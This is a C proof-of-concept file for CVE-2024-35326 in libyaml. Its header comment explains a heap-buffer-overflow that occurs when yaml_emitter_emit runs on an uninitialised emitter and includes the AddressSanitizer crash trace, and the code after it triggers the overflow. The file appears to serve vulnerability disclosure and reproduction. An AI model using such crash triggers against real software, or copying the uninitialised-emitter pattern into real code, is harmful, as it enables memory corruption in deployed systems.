/* CVE-2024-35326
Target:
    https://github.com/yaml/libyaml
    latest verify at 20240508, commit abd744ec2fb3b8e38e01796a1485c1f25f8fb5f6

Description:
    when call `yaml_emitter_emit` without `yaml_emitter_initialize` will cause heap-buffer-overflow
    the source code like below:

    yaml_emitter_emit(yaml_emitter_t *emitter, yaml_event_t *event)
    {
        // put event to emitter->events queue
        if (!ENQUEUE(emitter, emitter->events, *event)) {
            yaml_event_delete(event);
            return 0;
        }
        ...
    }
    #define ENQUEUE(context, queue, value)                                                                  \
        (((queue).tail != (queue).end || yaml_queue_extend((void **)&(queue).start, (void **)&(queue).head, \
                                                        (void **)&(queue).tail, (void **)&(queue).end))  \
            ? (*((queue).tail++) = value, 1)                                                               \
            : ((context)->error = YAML_MEMORY_ERROR, 0))

    without init emitter, the `tail=0`, `end=0`, `start=0`, `head=0`, 
    in the `ENQUEUE` macro, it will call `yaml_queue_extend` to realloc memory size 1,
    finally, *((queue).tail++) = value (value is a event struct point) will cause heap-buffer-overflow

POC:
╰─ ./poc
heap-buffer-overflow
=================================================================
==1898254==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000031 at pc 0x000000492f40 bp 0x7fffc1f32d40 sp 0x7fffc1f32508
WRITE of size 104 at 0x602000000031 thread T0
    #0 0x492f3f in __asan_memcpy (~/idhyt/poc/poc+0x492f3f)
    #1 0x4cab22 in yaml_emitter_emit ~/idhyt/poc/libyaml/src/emitter.c:283:10
    #2 0x4c3611 in poc ~/idhyt/poc/./buffer-overflow-on-emitter.c:27:5
    #3 0x4c3611 in main ~/idhyt/poc/./buffer-overflow-on-emitter.c:33:5
    #4 0x7f6f7be19082 in __libc_start_main /build/glibc-e2p3jK/glibc-2.31/csu/../csu/libc-start.c:308:16
    #5 0x41b2fd in _start (~/idhyt/poc/poc+0x41b2fd)

0x602000000031 is located 0 bytes to the right of 1-byte region [0x602000000030,0x602000000031)
allocated by thread T0 here:
    #0 0x493a3d in malloc (~/idhyt/poc/poc+0x493a3d)
    #1 0x4c4037 in yaml_realloc ~/idhyt/poc/libyaml/src/api.c:43:50
    #2 0x4c4037 in yaml_queue_extend ~/idhyt/poc/libyaml/src/api.c:147:27

SUMMARY: AddressSanitizer: heap-buffer-overflow (~/idhyt/poc/poc+0x492f3f) in __asan_memcpy
Shadow bytes around the buggy address:
  0x0c047fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c047fff8000: fa fa 07 fa fa fa[01]fa fa fa fa fa fa fa fa fa
  0x0c047fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==1898254==ABORTING


*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <yaml.h>

void poc() {
    yaml_document_t document;
    memset(&document, 0, sizeof(yaml_document_t));
    yaml_document_initialize(&document, NULL, NULL, NULL, 0, 0);

    yaml_event_t event;
    memset(&event, 0, sizeof(yaml_event_t));

    yaml_emitter_t emitter;
    memset(&emitter, 0, sizeof(yaml_emitter_t));
    yaml_emitter_emit(&emitter, &event);
}

int main(int argc, char *argv[])
{
    printf("heap-buffer-overflow\n");
    poc();
    return 0;
}
